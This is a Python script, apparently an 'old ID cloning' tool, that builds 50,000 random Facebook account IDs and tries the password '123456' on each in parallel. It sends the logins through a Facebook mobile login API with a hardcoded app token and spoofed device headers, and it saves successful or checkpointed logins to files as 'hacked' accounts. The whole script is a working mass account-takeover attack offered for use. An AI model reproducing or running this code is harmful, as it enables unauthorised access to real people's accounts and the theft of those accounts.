W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
 
 
 
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")
 
try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")
 
import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor

logo0 = '''
\033[1;33;40m--------------------------------------------------
✨M─────AH💠AD─────I✨
 just-another-nobody
 \033[1;33;40m--------------------------------------------------
'''



logo = ''' 
\033[1;33;40m--------------------------------------------------
✨M─────AH💠AD─────I✨
 just-another-nobody
 Old Id Cloning
 \033[1;33;40m--------------------------------------------------
                                                
\033[1;33;40m--------------------------------------------------
  \033[1;36;40mAuthor     \033[1;33;40m: \033[0;37;40mjust-another-nobody
  \033[1;36;40mGitHub     \033[1;33;40m: \033[0;37;40mhttps://github.com/just-another-nobody
  \033[1;36;40mFacebook   \033[1;33;40m: \033[0;37;40mhttps://Facebook.com/just-another-nobody
  \033[1;36;40mPublic     \033[1;33;40m: \033[0;37;40m18-03-2023
\033[1;33;40m--------------------------------------------------


                                '''

import os
os.system('clear')

print(logo0)
muser = input('\t\033[1;33;40m[\033[1;31;40m?\033[1;33;40m] \033[1;32;40mEnter Your User Name \033[1;33;40m>>>\033[1;32;40m ')
 
def runtxt(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
 
 
plist = (platform.uname())[2]
basex = plist
basex1 = basex.encode('ascii')
basex2 = base64.b64encode(basex1)
basex3 = basex2.decode('ascii')
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
 
 
class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system('xdg-open https://www.facebook.com/just-another-nobody')
		os.system("clear")
		
		print (logo)
		print("   \033[1;32;40mRandom Old Id Cloning \033[1;33;40m [\033[1;31;40m123456\033[1;33;40m] \033[1;33;40m [\033[1;31;40m5000\033[1;33;40m]\n\n   \033[1;33;40m[\033[1;31;40m1\033[1;33;40m] \033[1;32;40mStart \n   \033[1;33;40m[\033[1;31;40m2\033[1;33;40m] \033[1;32;40mExit \n")
		tanya = input("\t\033[1;33;40m[\033[1;31;40m!\033[1;33;40m] \033[1;32;40mEnter \033[1;33;40m>>>\033[1;31;40m ")
		if tanya in ["", " "]:
			Main()
		elif tanya in ["1", "01"]:
				    self.fbtua()
	
	def fbtua(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		limit = 50000
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			os.system('xdg-open https://github.com/11111')
			os.system('clear')
			print(logo)
			logo2 = '''\033[1;33;40m--------------------------------------------------
\033[1;32;40m[-_-] Please wait__
[-_-] Total : 50000
[-_-] Lets Start Hunting
\033[1;33;40m--------------------------------------------------
\033[1;32;40mHacked Accouny Will Appear Here
			
			'''
			print(logo2) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				listpass = '123456'
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n    [#] CRACK COMPLETE...")
		except Exception as e:exit(str(e))
 
	def api(self, uid, pwx):
		ua = random.choice(muser)
		sys.stdout.write(
			"\r\r %s[>_] [BY] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [CP] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
 
		self.loop +=1
 
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("   ___________________  ")
		print("\n [*] Author    : just-another-nobody")
		print(" [*] Team      : xyz  \n")
		print(" [ Sosial Media  ] \n")
		print(" [*] Facebook  : https://www.facebook.com/just-another-nobody ")
		exit(" [*] GitHub    : https://github.com/just-another-nobody")
	else:
		Main()
 
try:Main()
except Exception as e:exit(str(e))
